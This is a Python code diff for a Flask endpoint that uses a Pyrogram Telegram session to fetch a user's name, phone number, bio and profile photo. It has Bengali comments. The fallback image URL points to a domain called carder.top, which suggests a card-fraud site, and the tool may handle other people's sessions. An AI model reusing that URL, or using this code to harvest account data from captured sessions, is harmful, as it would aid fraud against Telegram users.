@@ -242,21 +242,33 @@ def get_user_profile():
         async def _fetch():
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
+            
+            # ইউজারের বেসিক ইনফো আনা
             me = await client.get_me()
             
+            # ইউজারের বায়ো (Bio) বের করার জন্য full chat ইনফো ফেচ করা
+            full_chat = await client.get_chat("me")
+            user_bio = full_chat.bio if full_chat.bio else "No bio available"
+            
+            # প্রোফাইল ছবি ডাউনলোড করা
             photo_url = None
             async for photo in client.get_chat_photos("me", limit=1):
+                os.makedirs("static", exist_ok=True)
                 file_path = await client.download_media(photo.file_id, file_name=f"static/profile_{me.id}.jpg")
                 photo_url = "/" + file_path
+                
             await client.disconnect()
 
+            # সব ডেটা একসাথে রিটার্ন করা
             return {
                 "name": f"{me.first_name or ''} {me.last_name or ''}".strip(),
                 "username": f"@{me.username}" if me.username else "No Username",
                 "id": me.id,
                 "phone": me.phone_number or phone,
+                "bio": user_bio,
                 "photo": photo_url or "https://carder.top/imagens/1791918460640-323067073.jpg"
             }
+            
         profile_data = run_async(_fetch())
         return jsonify({"status": "success", "profile": profile_data})
     except Exception as e:
